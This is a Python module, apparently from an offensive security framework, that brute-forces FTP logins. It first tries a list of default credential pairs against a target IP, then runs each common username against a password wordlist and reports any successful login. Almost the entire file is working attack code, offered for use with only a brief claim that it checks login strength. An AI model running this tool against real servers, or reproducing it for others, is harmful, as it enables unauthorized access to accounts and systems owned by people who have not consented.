import ftplib
import os
import smf
from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
from apps.utility.colors import C

metadata = {
    "Name": "Bruteforce FTP connection",
    "Description": """
Bruteforce FTP username and password 
to bypass FTP login quickly to find out
is FTP login auth that weak or quite strong.
""",
    "Author": ["zxelzy"],
    "Action": [
        [
            "Bruteforce",
            {"Description": "Trying to bypass with thousands of passwords and usernames"},
        ],
    ],
    "DefaultAction": "Bruteforce",
    "License": "SMF License",
    "Date": "2025-07-02",
}
REQUIRED_OPTIONS = {"IP": "", "PASS": ""}


def test_ftp(target_ip, port, username, password):
    ftp = ftplib.FTP()
    try:
        ftp.connect(target_ip, int(port), timeout=3)
        ftp.login(username, password)
        ftp.quit()
        return True
    except:
        try:
            ftp.close()
        except:
            pass
        return False


def execute(options):
    target_ip = options.get("IP")
    port = 21
    wordlist_path = options.get("PASS")

    smf.printf(f"{C.HEADER}--- FTP BRUTE FORCE: {target_ip} ---")
    try:
        for user, passwd in DEFAULT_CREDS:
            if test_ftp(target_ip, port, user, passwd):
                smf.printf(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
                return

        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, "r", errors="ignore") as f:
                password = [line.strip() for line in f if line.strip()]

                for user in COMMON_USERS:
                    smf.printf(f"{C.MENU}  [*] Testing user: {user}")
                    for pw in password:
                        if test_ftp(target_ip, port, user, pw):
                            smf.printf(
                                f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{pw}"
                            )
                            return

    except KeyboardInterrupt:
        return
    except Exception as e:
        smf.printf("{C.ERROR}[x] ERROR =>", e)
        return
